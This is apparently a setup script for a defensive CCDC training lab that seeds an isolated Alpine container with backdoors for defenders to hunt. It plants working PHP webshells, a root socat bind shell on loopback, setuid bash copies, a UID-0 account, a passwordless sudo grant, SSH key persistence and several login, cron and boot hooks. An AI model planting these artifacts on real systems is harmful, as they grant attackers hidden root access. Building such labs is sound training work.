#!/bin/sh
# This script is only for the disposable Alpine container, never the host.
set -eu
[ "${CCDC_LAB_SEED:-}" = container-only ] && [ -f /.dockerenv ] || {
    printf 'Refusing to seed outside the CCDC Docker container.\n' >&2
    exit 1
}
[ -f /var/lib/ccdc-lab/seeded ] && exit 0
umask 022
mkdir -p /var/lib/ccdc-lab /var/log/ccdc-lab /root/.lab-keys \
    /home/defender/.ssh /root/.ssh /tmp/.cache /etc/profile.d \
    /etc/update-motd.d /etc/apt/apt.conf.d /etc/systemd/system \
    /etc/pam.d /usr/include /opt/.drivers /var/www/html/assets \
    /var/www/html/uploads /opt/customer/public /usr/local/libexec/.rescue \
    /var/spool/cron/crontabs /etc/runlevels/default /etc/apk/commit_hooks.d
: > /var/lib/ccdc-lab/seed-status
chmod 700 /root/.lab-keys /home/defender/.ssh /root/.ssh

# SSH key persistence: a generated lab-only key, never an existing user's key.
ssh-keygen -q -t ed25519 -N '' -C 'support-maintenance' -f /root/.lab-keys/operator
cat > /usr/local/bin/support-console <<'PAYLOAD'
#!/bin/sh
printf 'SSH maintenance key used\n' >> "$HOME/.session-audit"
exec /bin/bash
PAYLOAD
chmod 755 /usr/local/bin/support-console
{
    printf 'command="/usr/local/bin/support-console",no-agent-forwarding,no-port-forwarding,no-X11-forwarding '
    cat /root/.lab-keys/operator.pub
} > /home/defender/.ssh/authorized_keys
cp /root/.lab-keys/operator.pub /root/.ssh/authorized_keys
chmod 600 /home/defender/.ssh/authorized_keys /root/.ssh/authorized_keys
chown -R defender:defender /home/defender/.ssh

# Unauthorized root-equivalent identities and privilege grants.
printf 'backupsvc:x:0:0:Backup service:/root:/bin/bash\n' >> /etc/passwd
printf 'backupsvc:!:1:0:99999:7:::\n' >> /etc/shadow
printf 'support ALL=(ALL) NOPASSWD: ALL\n' > /etc/sudoers.d/90-support
chmod 440 /etc/sudoers.d/90-support
cp /bin/bash /usr/local/libexec/.rescue/bash
chown root:root /usr/local/libexec/.rescue/bash
chmod 4755 /usr/local/libexec/.rescue/bash
cp /opt/lab/bin/diagnostic /usr/local/libexec/.rescue/diagnostic
chown root:root /usr/local/libexec/.rescue/diagnostic
chmod 4777 /usr/local/libexec/.rescue/diagnostic

# Active shell, cron, boot and MOTD hooks only write local training markers.
cat > /tmp/.cache/session-refresh.sh <<'PAYLOAD'
#!/bin/sh
printf 'cron refresh %s\n' "$(date -u +%FT%TZ)" >> /var/log/ccdc-lab/events.log
PAYLOAD
cat > /usr/local/libexec/.metrics <<'PAYLOAD'
#!/bin/sh
printf 'unapproved metrics %s\n' "$(date -u +%FT%TZ)" >> "$HOME/.metrics-events"
PAYLOAD
cat > /tmp/.cache/profile-check.sh <<'PAYLOAD'
#!/bin/sh
printf 'profile hook\n' >> "$HOME/.session-audit"
PAYLOAD
cat > /tmp/.cache/boot-check.sh <<'PAYLOAD'
#!/bin/sh
printf 'rc.local hook\n' >> /var/log/ccdc-lab/events.log
PAYLOAD
cat > /tmp/.cache/motd-check.sh <<'PAYLOAD'
#!/bin/sh
printf 'motd hook\n' >> "$HOME/.session-audit"
PAYLOAD
chmod 755 /tmp/.cache/*.sh /usr/local/libexec/.metrics
printf '* * * * * /tmp/.cache/session-refresh.sh\n' > /var/spool/cron/crontabs/root
# A working, innocuous-looking cron implant is deliberately a baseline blind spot.
printf '* * * * * /usr/local/libexec/.metrics\n' > /var/spool/cron/crontabs/support
chmod 600 /var/spool/cron/crontabs/root /var/spool/cron/crontabs/support
cat > /home/defender/.bashrc <<'PAYLOAD'
/tmp/.cache/profile-check.sh
alias ls='printf "session monitored\n" >> "$HOME/.session-audit"; /bin/ls'
PAYLOAD
cat > /home/defender/.bash_profile <<'PAYLOAD'
[ ! -f "$HOME/.bashrc" ] || . "$HOME/.bashrc"
PAYLOAD
chown defender:defender /home/defender/.bashrc /home/defender/.bash_profile
cat > /etc/profile.d/20-session.sh <<'PAYLOAD'
/tmp/.cache/profile-check.sh
PAYLOAD
cat > /etc/update-motd.d/97-session <<'PAYLOAD'
#!/bin/sh
/tmp/.cache/motd-check.sh
PAYLOAD
# Alpine's SSH does not automatically run Debian update-motd hooks; wire them to
# the login profile explicitly and record this adaptation in the answer key.
cat > /etc/profile.d/30-motd.sh <<'PAYLOAD'
for lab_motd in /etc/update-motd.d/*; do
    [ ! -x "$lab_motd" ] || "$lab_motd"
done
unset lab_motd
PAYLOAD
chmod 755 /etc/update-motd.d/97-session
cat > /etc/rc.local <<'PAYLOAD'
#!/bin/sh
/tmp/.cache/boot-check.sh
PAYLOAD
chmod 755 /etc/rc.local

# Working loopback-only root bind shell. It has no callback or external address.
cat > /etc/init.d/network-check <<'PAYLOAD'
#!/bin/sh
case ${1:-start} in
    start)
        if [ -s /run/network-check.pid ] && kill -0 "$(cat /run/network-check.pid)" 2>/dev/null; then exit 0; fi
        socat TCP-LISTEN:4444,bind=127.0.0.1,reuseaddr,fork EXEC:/bin/sh >> /var/log/ccdc-lab/bind-shell.log 2>&1 &
        echo "$!" > /run/network-check.pid ;;
    stop)
        [ ! -s /run/network-check.pid ] || kill "$(cat /run/network-check.pid)" ;;
    *) printf 'Usage: %s start|stop\n' "$0"; exit 2 ;;
esac
PAYLOAD
chmod 755 /etc/init.d/network-check
ln -s /etc/init.d/network-check /etc/runlevels/default/network-check

# A native package-manager hook the original Linux-article scanner does not cover.
cat > /etc/apk/commit_hooks.d/90-audit <<'PAYLOAD'
#!/bin/sh
printf 'apk hook %s\n' "$*" >> /var/log/ccdc-lab/events.log
PAYLOAD
chmod 755 /etc/apk/commit_hooks.d/90-audit

# Real preload behavior is per-process on musl. The glibc file below is a fixture.
cp /opt/lab/bin/libaudit.so /tmp/.cache/libaudit.so
cp /opt/lab/bin/lab-sleeper /usr/local/libexec/lab-sleeper
printf '/tmp/.cache/libaudit.so\n' > /etc/ld.so.preload

# These policies are genuine PAM syntax but no live login service uses them.
cat > /etc/pam.d/lab-recovery <<'PAYLOAD'
auth sufficient pam_permit.so
account required pam_permit.so
PAYLOAD
cat > /etc/pam.d/lab-telemetry <<'PAYLOAD'
auth optional pam_exec.so /tmp/.cache/profile-check.sh
auth required pam_deny.so
PAYLOAD
printf '#define LAB_BACKDOOR_ARTIFACT "hunt3r"\n' > /usr/include/type.h

# Inactive cross-distribution artifacts, clearly identified in scenarios.tsv.
cat > /etc/apt/apt.conf.d/99cache <<'PAYLOAD'
APT::Update::Post-Invoke { "/tmp/.cache/session-refresh.sh"; };
PAYLOAD
cat > /etc/systemd/system/cache-sync.service <<'PAYLOAD'
[Unit]
Description=Cache synchronization
[Service]
ExecStart=/tmp/.cache/session-refresh.sh
[Install]
WantedBy=multi-user.target
PAYLOAD
cat > /opt/.drivers/telemetry.ko <<'PAYLOAD'
CCDC LAB FIXTURE ONLY: this is text, not a loadable kernel module.
PAYLOAD
printf 'LAB FIXTURE: diamorphine module indicator; no module was loaded.\n' > /var/log/kern.log

# Actual webshells, served under the unprivileged webapp account.
cat > /var/www/html/assets/cache.php <<'PAYLOAD'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "cache endpoint\n";
}
PAYLOAD
cat > /var/www/html/uploads/preview.php <<'PAYLOAD'
<?php
if (isset($_POST['payload'])) {
    eval(base64_decode($_POST['payload']));
}
PAYLOAD
cat > /opt/customer/public/debug.php <<'PAYLOAD'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
PAYLOAD
printf 'CCDC practice web service\n' > /var/www/html/index.html
printf 'ok\n' > /var/www/html/health.txt
chown -R webapp:webapp /var/www/html /opt/customer/public

# Runtime rather than image-layer ACLs: Docker layer storage may discard ACL xattrs.
printf ': # Service profile\n' > /etc/profile.d/40-service.sh
if setfacl -m u:support:rw /etc/profile.d/40-service.sh \
    && setfacl -m u:support:r /etc/shadow \
    && setfacl -m u:support:rx /root; then
    printf 'ACL=available\n' >> /var/lib/ccdc-lab/seed-status
else
    printf 'ACL=unsupported\n' >> /var/lib/ccdc-lab/seed-status
    printf 'ACL exercise unavailable on this Docker backing filesystem.\n' >&2
fi
visudo -cf /etc/sudoers
printf 'seeded\n' > /var/lib/ccdc-lab/seeded
